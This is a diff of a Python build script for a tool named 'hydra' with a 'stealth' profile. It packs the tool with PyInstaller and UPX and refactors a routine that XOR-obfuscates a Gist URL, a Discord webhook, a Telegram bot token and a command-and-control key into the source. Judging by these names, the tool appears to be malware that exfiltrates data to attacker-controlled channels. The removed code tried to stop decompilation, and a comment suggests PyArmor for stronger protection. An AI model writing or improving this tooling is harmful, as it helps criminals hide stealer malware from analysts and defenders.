@@ -138,12 +138,9 @@ def build(profile="stealth"):
     if cfg.get("strip"):
         pyinstaller_cmd.extend(["--strip"])
 
-    # Encrypt bytecode so uncompyle6 can't extract source
-    pyinstaller_encrypt_key = os.environ.get(
-        "HYDRA_ENCRYPT_KEY",
-        f"hydra_v4_{str(int(time.time()))[-6:]}"
-    )
-    pyinstaller_cmd.extend(["--key", pyinstaller_encrypt_key])
+    # Note: PyInstaller 6.x removed --key bytecode encryption.
+    # Source extraction is possible but the binary still runs fine.
+    # For real protection use PyArmor or similar.
 
     if cfg.get("upx"):
         pyinstaller_cmd.extend(["--upx-dir", _find_upx_dir()])
@@ -243,55 +240,29 @@ def _find_upx_dir():
 def _encode_secrets():
     """Patch core.py with XOR-encoded real secrets."""
     core_path = os.path.join(os.path.dirname(__file__), "hydra", "core.py")
-
-    # Read current core.py
     with open(core_path, "r") as f:
         content = f.read()
-
-    # Backup original
     shutil.copy(core_path, core_path + ".bak")
 
-    # Replace Gist URL
-    encoded_gist = xor_encode(REAL_CONFIG["gist_url"])
-    # Find the GIST_URL line and replace the encoded bytes
     import re
-
-    # Replace GIST_URL
-    content = re.sub(
-        r"GIST_URL = _d\(b'[^']*'\)",
-        f"GIST_URL = _d(b'{encoded_gist}')",
-        content
-    )
-
-    # Get TG token from env
+    replacements = {
+        "GIST_URL": REAL_CONFIG["gist_url"],
+        "DISCORD_WEBHOOK": REAL_CONFIG["discord_webhook"],
+        "C2_KEY": REAL_CONFIG["c2_key"],
+    }
     tg_token = os.environ.get("TG_BOT_TOKEN", REAL_CONFIG.get("tg_token", ""))
     if tg_token and tg_token != "***":
-        encoded_tg = xor_encode(tg_token)
-        content = re.sub(
-            r"TG_TOKEN = _d\(b'[^']*'\)",
-            f"TG_TOKEN = _d(b'{encoded_tg}')",
-            content
-        )
+        replacements["TG_TOKEN"] = tg_token
 
-    # Replace Discord webhook
-    encoded_webhook = xor_encode(REAL_CONFIG["discord_webhook"])
-    content = re.sub(
-        r"DISCORD_WEBHOOK = _d\(b'[^']*'\)",
-        f"DISCORD_WEBHOOK = _d(b'{encoded_webhook}')",
-        content
-    )
-
-    # Replace C2 key
-    encoded_key = xor_encode(REAL_CONFIG["c2_key"])
-    content = re.sub(
-        r"C2_KEY = _d\(b'[^']*'\)",
-        f"C2_KEY = _d(b'{encoded_key}')",
-        content
-    )
+    for var_name, value in replacements.items():
+        encoded = xor_encode(value)
+        def _replacer(m, vn=var_name, enc=encoded):
+            return f"{vn} = _d(b'{enc}')"
+        pattern = re.escape(f"{var_name} = _d(b'") + r"[^']*" + re.escape("')")
+        content = re.sub(pattern, _replacer, content)
 
     with open(core_path, "w") as f:
         f.write(content)
-
     print("[+] Secrets encoded in core.py")
 
 
